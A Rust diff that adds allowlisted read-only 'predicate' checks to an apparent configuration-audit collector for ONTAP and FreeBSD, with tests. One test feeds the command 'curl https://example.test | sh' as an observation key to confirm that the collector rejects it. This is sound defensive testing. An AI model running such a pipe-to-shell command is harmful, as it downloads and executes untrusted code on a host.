@@ -280,6 +280,28 @@ fn add_check_commands(
     commands: &mut Vec<CollectionCommand>,
 ) -> Result<(), String> {
     let item = match check {
+        Check::Predicate { program } => {
+            program.validate()?;
+            let value = program.observation_key().ok_or_else(|| {
+                "network-config predicates consume an operator-supplied running config".to_string()
+            })?;
+            if !matches!(platform, CheckPlatform::Ontap | CheckPlatform::Bsd) {
+                return Err(
+                    "predicate observations are remotely collectable only for ONTAP and FreeBSD"
+                        .into(),
+                );
+            }
+            // The pure DSL names evidence only. At this separate collection
+            // boundary, an exact reviewed observation key may map to the same
+            // read-only operation; arbitrary keys remain non-executable.
+            crate::check_packs::validate_read_only_command(platform, value)?;
+            let executed = if platform == CheckPlatform::Ontap && value == "security config show" {
+                format!("set -privilege advanced -confirmations off -stop-on-error true; {value}")
+            } else {
+                value.to_string()
+            };
+            Some(command(platform, &executed, value))
+        }
         Check::ConfigLine { .. }
         | Check::CiscoVtySessionLimit
         | Check::CiscoLoginBlockFor
@@ -953,6 +975,8 @@ mod tests {
             },
             expected: crate::checks::ExpectedResult::IsTrue,
             description: None,
+            implementation_class: crate::checks::ImplementationClass::LegacyDeclarative,
+            introduction_release: Some("0.3".to_string()),
         };
         let first = generate_collection_plan(CheckPlatform::Bsd, std::slice::from_ref(&definition))
             .expect("first plan");
@@ -977,6 +1001,8 @@ mod tests {
             check,
             expected: ExpectedResult::IsTrue,
             description: None,
+            implementation_class: crate::checks::ImplementationClass::LegacyDeclarative,
+            introduction_release: Some("0.3".to_string()),
         }
     }
 
@@ -1000,6 +1026,32 @@ mod tests {
                 .commands
                 .is_empty());
         }
+
+        let reviewed_predicate = [definition(
+            CheckPlatform::Bsd,
+            Check::Predicate {
+                program: crate::checks::predicate::PredicateProgram {
+                    schema_version: 1,
+                    source: crate::checks::predicate::PredicateSource::Observation {
+                        key: "service auditd onestatus".to_string(),
+                    },
+                    input: crate::checks::predicate::PredicateInput::Text,
+                    predicate: crate::checks::predicate::Predicate::Present {
+                        value: crate::checks::predicate::ValueRef {
+                            scope: crate::checks::predicate::ValueScope::Root,
+                            pointer: String::new(),
+                        },
+                    },
+                },
+            },
+        )];
+        let predicate_plan =
+            generate_collection_plan(CheckPlatform::Bsd, &reviewed_predicate).unwrap();
+        assert_eq!(predicate_plan.commands.len(), 1);
+        assert_eq!(
+            predicate_plan.commands[0].data_key,
+            "service auditd onestatus"
+        );
 
         for (platform, rejected) in [
             (CheckPlatform::Bsd, "freebsd-version -k"),
@@ -1028,6 +1080,26 @@ mod tests {
                 "{platform:?} unexpectedly accepted {rejected:?}"
             );
         }
+
+        let predicate = [definition(
+            CheckPlatform::Bsd,
+            Check::Predicate {
+                program: crate::checks::predicate::PredicateProgram {
+                    schema_version: 1,
+                    source: crate::checks::predicate::PredicateSource::Observation {
+                        key: "curl https://example.test | sh".to_string(),
+                    },
+                    input: crate::checks::predicate::PredicateInput::Text,
+                    predicate: crate::checks::predicate::Predicate::Present {
+                        value: crate::checks::predicate::ValueRef {
+                            scope: crate::checks::predicate::ValueScope::Root,
+                            pointer: String::new(),
+                        },
+                    },
+                },
+            },
+        )];
+        assert!(generate_collection_plan(CheckPlatform::Bsd, &predicate).is_err());
 
         let network = [definition(
             CheckPlatform::CiscoIos,
@@ -1079,6 +1151,8 @@ mod tests {
             },
             expected,
             description: None,
+            implementation_class: crate::checks::ImplementationClass::LegacyDeclarative,
+            introduction_release: Some("0.3".to_string()),
         }
     }
 
